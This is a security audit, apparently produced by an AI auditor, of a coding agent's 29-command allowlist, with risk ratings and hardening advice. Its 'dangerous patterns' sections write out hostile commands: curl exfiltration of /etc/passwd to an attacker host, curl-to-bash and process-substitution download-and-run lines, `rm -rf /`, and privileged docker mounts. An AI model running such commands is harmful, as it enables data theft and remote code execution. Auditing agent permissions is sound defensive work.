# Command Allowlist Security Audit

**Audit Date:** 2026-01-11
**Total Commands Reviewed:** 29
**Auditor:** Claude Opus 4.5 (automated security analysis)

## Summary

This document audits all 29 commands in the AutoCoder allowlist (`security.py`) for dangerous patterns that could allow code execution, privilege escalation, or security bypass.

### Risk Categories

| Risk Level | Description |
|------------|-------------|
| **HIGH** | Direct code execution capability |
| **MEDIUM** | Indirect execution or significant security implications |
| **LOW** | Minimal security concerns with current constraints |

### Quick Reference

| Risk Level | Commands |
|------------|----------|
| **HIGH** | `bash`, `sh`, `node`, `npm`, `npx`, `pnpm`, `docker`, `git`, `curl` |
| **MEDIUM** | `rm`, `mv`, `cp`, `chmod`, `kill`, `pkill`, `init.sh` |
| **LOW** | `ls`, `cat`, `head`, `tail`, `wc`, `grep`, `pwd`, `echo`, `mkdir`, `touch`, `ps`, `lsof`, `sleep` |

---

## HIGH RISK Commands

### bash / sh

**Risk:** Direct arbitrary code execution

**Dangerous Patterns:**
- `bash -c "malicious command"` - Execute any command
- `bash script.sh` - Execute arbitrary scripts
- `echo 'malicious' | bash` - Pipe-to-shell execution
- Process substitution: `bash <(curl evil.com/script)`

**Current Mitigation:**
- All commands within bash/sh are still validated against allowlist
- Commands parsed by `extract_commands()` to check sub-commands

**Residual Risk:** HIGH - These are inherently powerful. The command parser may miss edge cases in complex shell constructs.

**Recommendation:**
- Consider removing `bash`/`sh` if not essential
- If kept, add logging for all bash/sh invocations
- Implement shell AST parsing for deeper validation

---

### node

**Risk:** Direct JavaScript code execution

**Dangerous Patterns:**
- `node -e "require('child_process').exec('malicious')"` - Inline code execution
- `node script.js` - Execute arbitrary scripts
- `node --require malicious.js` - Load modules via require
- `node -p "process.env"` - Environment variable exposure

**Current Mitigation:** None

**Residual Risk:** HIGH - Node can execute arbitrary code and access filesystem, network, child processes.

**Recommendation:**
- Block `-e`, `-p`, `--eval`, `--print` flags
- Consider restricting to specific script names
- Apply `get_safe_environment()` to limit credential exposure

---

### npm / npx / pnpm

**Risk:** Arbitrary code execution via lifecycle scripts and package installation

**Dangerous Patterns:**
- `npm install malicious-pkg` - Runs install scripts
- `npm run arbitrary-script` - Runs package.json scripts
- `npx malicious-pkg` - Download and execute any package
- `npm config set prefix /tmp/evil && npm install -g pkg` - Modify npm behavior
- `pnpm exec arbitrary` - Execute arbitrary binaries

**Lifecycle script execution:**
- preinstall, install, postinstall
- prepare, prepublish, prepublishOnly
- prepack, postpack
- Custom scripts in package.json

**Current Mitigation:** None

**Residual Risk:** HIGH - Package managers are designed to execute code. Any `npm install` can run arbitrary code.

**Recommendation:**
- Consider `--ignore-scripts` flag enforcement
- Block `npm config set` commands
- Block `npx` for untrusted packages (difficult to validate)
- Run in container isolation when possible

---

### docker

**Risk:** Container escape, host filesystem access, privilege escalation

**Dangerous Patterns:**
- `docker run -v /:/host` - Mount host filesystem
- `docker run --privileged` - Full host access
- `docker run --pid=host` - Access host processes
- `docker exec container_id sh` - Execute in running container
- `docker build -` - Build from stdin (potential code injection)
- `docker cp container:/sensitive /local` - Extract files

**Current Mitigation:** None

**Residual Risk:** HIGH - Docker with default permissions is extremely powerful.

**Recommendation:**
- Block `--privileged`, `-v`, `--volume`, `--mount` to root
- Block `--pid=host`, `--net=host`, `--ipc=host`
- Consider allowlist of specific docker commands (run, ps, logs, stop)
- Validate container names/IDs

---

### git

**Risk:** Code execution via hooks, aliases, and configuration

**Dangerous Patterns:**
- `git config --global alias.x '!malicious_command'` - Create malicious alias
- `git clone malicious-repo` - Clone with hooks (post-checkout, post-merge)
- `git submodule update --init` - Clone arbitrary repos
- `git config core.sshCommand 'malicious'` - Replace SSH
- `git filter-branch --tree-filter 'malicious'` - Execute on each commit
- `git -c "core.pager=malicious"` - Override config

**Current Mitigation:** None

**Residual Risk:** HIGH - Git is designed for extensibility; many commands can trigger code execution.

**Recommendation:**
- Block `git config --global`
- Block `-c` config override flag
- Consider disabling `git submodule` or limiting to known repos
- Use `GIT_TERMINAL_PROMPT=0` to prevent credential prompts

---

### curl

**Risk:** Data exfiltration, arbitrary file download, network access

**Dangerous Patterns:**
- `curl attacker.com/receive -d "$(cat /etc/passwd)"` - Exfiltration
- `curl attacker.com/shell.sh | bash` - Download and execute
- `curl -o /path/file attacker.com/payload` - Write arbitrary files
- `curl --upload-file sensitive.txt attacker.com` - Upload files
- `curl -u user:pass` - Credential in command line

**Current Mitigation:** None

**Residual Risk:** HIGH - Curl provides unrestricted network access for both sending and receiving.

**Recommendation:**
- Consider egress filtering at network level
- Block `--upload-file`, `-T` flags
- Log all curl invocations with destinations
- Consider domain allowlist for curl targets

---

## MEDIUM RISK Commands

### rm

**Risk:** Data destruction, denial of service

**Dangerous Patterns:**
- `rm -rf /` - System destruction (sandboxed, but risky)
- `rm -rf important_directory/*` - Project data loss
- `rm -rf .git` - Version control destruction

**Current Mitigation:**
- Filesystem sandbox limits to project directory
- No access to system directories

**Residual Risk:** MEDIUM - Limited to project directory, but can still destroy project data.

**Recommendation:**
- Consider blocking `-r` flag for non-interactive safety
- Add confirmation prompts for destructive operations
- Maintain regular git commits as recovery mechanism

---

### mv / cp

**Risk:** File overwrite, symlink-based attacks

**Dangerous Patterns:**
- `mv file /important/path` - Overwrite important files
- `cp -r source /tmp/` - Copy sensitive data out
- Symlink creation via `cp -s` followed by operations

**Current Mitigation:**
- Filesystem sandbox limits destinations
- Symlink escape detection (added in 05-01)

**Residual Risk:** MEDIUM - Operations constrained to project directory.

**Recommendation:** Current mitigations are appropriate.

---

### chmod

**Risk:** Permission manipulation, making files executable

**Dangerous Patterns:**
- `chmod 777 file` - World-writable files
- `chmod +x script.sh && ./script.sh` - Make then execute

**Current Mitigation:**
- Extra validation: Only `+x` mode allowed
- Flags like `-R` blocked

**Residual Risk:** LOW - Well-constrained to making files executable only.

**Recommendation:** Current mitigations are appropriate.

---

### kill / pkill

**Risk:** Process termination, denial of service

**Dangerous Patterns:**
- `kill -9 1` - Kill init (not in project sandbox)
- `pkill -9 agent` - Kill the agent itself
- `pkill -u root` - Kill system processes (if running as root)

**Current Mitigation:**
- `pkill` has extra validation: only dev processes (node, npm, npx, vite, next)
- `kill` requires specific PID (no pattern matching)

**Residual Risk:** MEDIUM - `kill` with arbitrary PID could target important processes if attacker knows PIDs.

**Recommendation:**
- Consider adding PID validation (only kill child processes)
- Log all kill/pkill invocations

---

### init.sh

**Risk:** Arbitrary script execution

**Dangerous Patterns:**
- Creates avenue for executing project-specific scripts

**Current Mitigation:**
- Extra validation: Only `./init.sh` or paths ending in `/init.sh` allowed
- Must be in project directory (filesystem sandbox)

**Residual Risk:** MEDIUM - Relies on script content being safe; if compromised, full execution.

**Recommendation:** Current mitigations are appropriate. Consider script content validation in future.

---

## LOW RISK Commands

### File Inspection (ls, cat, head, tail, wc, grep)

**Risk:** Information disclosure within sandbox

**Patterns:**
- Can read any file within project directory
- `grep -r pattern /` would be blocked by sandbox

**Current Mitigation:**
- Filesystem sandbox limits access
- No ability to modify files

**Residual Risk:** LOW - Read-only operations in sandboxed directory.

**Recommendation:** No additional mitigations needed.

---

### Directory/Output (pwd, echo, mkdir, touch)

**Risk:** Minimal

**Patterns:**
- `echo` can output sensitive values: `echo $SECRET_KEY`
- `mkdir -p` creates directory structures

**Current Mitigation:**
- Environment sanitization (Task 2) reduces exposed variables
- Filesystem sandbox for directory creation

**Residual Risk:** LOW

**Recommendation:** No additional mitigations needed.

---

### Process Inspection (ps, lsof, sleep)

**Risk:** Information disclosure about running processes

**Patterns:**
- `ps aux` shows all processes with arguments (may expose secrets in args)
- `lsof` can reveal open files and network connections

**Current Mitigation:** None specific

**Residual Risk:** LOW - Passive observation only.

**Recommendation:** Consider if process visibility is needed; may expose other users' processes.

---

## Findings Summary

### Commands Requiring Additional Hardening

| Command | Recommended Action | Priority |
|---------|-------------------|----------|
| `bash`/`sh` | Consider removal or deep validation | HIGH |
| `node` | Block `-e`, `-p`, `--eval` flags | HIGH |
| `npm`/`npx`/`pnpm` | Consider `--ignore-scripts`, careful audit | HIGH |
| `docker` | Block privileged flags, volume mounts | HIGH |
| `git` | Block `config --global`, `-c` flag | MEDIUM |
| `curl` | Network-level egress filtering | MEDIUM |

### Defense in Depth Recommendations

1. **Container Isolation** - Run agent in container for additional filesystem/network isolation
2. **Resource Limits** - Apply `apply_resource_limits()` to prevent DoS (added in this phase)
3. **Environment Sanitization** - Apply `get_safe_environment()` to prevent credential leakage (added in this phase)
4. **Network Egress Filtering** - Consider proxy or firewall for outbound connections
5. **Audit Logging** - Log all command executions for incident response

### Commands Well-Mitigated

| Command | Current Mitigation | Assessment |
|---------|-------------------|------------|
| `chmod` | Only `+x` allowed | Sufficient |
| `pkill` | Only dev processes | Sufficient |
| `init.sh` | Path validation | Sufficient |

---

## Appendix: Full Command List

| # | Command | Risk | Has Extra Validation |
|---|---------|------|---------------------|
| 1 | `bash` | HIGH | No |
| 2 | `cat` | LOW | No |
| 3 | `chmod` | MEDIUM | Yes |
| 4 | `cp` | MEDIUM | No |
| 5 | `curl` | HIGH | No |
| 6 | `docker` | HIGH | No |
| 7 | `echo` | LOW | No |
| 8 | `git` | HIGH | No |
| 9 | `grep` | LOW | No |
| 10 | `head` | LOW | No |
| 11 | `init.sh` | MEDIUM | Yes |
| 12 | `kill` | MEDIUM | No |
| 13 | `ls` | LOW | No |
| 14 | `lsof` | LOW | No |
| 15 | `mkdir` | LOW | No |
| 16 | `mv` | MEDIUM | No |
| 17 | `node` | HIGH | No |
| 18 | `npm` | HIGH | No |
| 19 | `npx` | HIGH | No |
| 20 | `pkill` | MEDIUM | Yes |
| 21 | `pnpm` | HIGH | No |
| 22 | `ps` | LOW | No |
| 23 | `pwd` | LOW | No |
| 24 | `rm` | MEDIUM | No |
| 25 | `sh` | HIGH | No |
| 26 | `sleep` | LOW | No |
| 27 | `tail` | LOW | No |
| 28 | `touch` | LOW | No |
| 29 | `wc` | LOW | No |

---

*Audit completed: 2026-01-11*
*Next review recommended: Before production deployment*
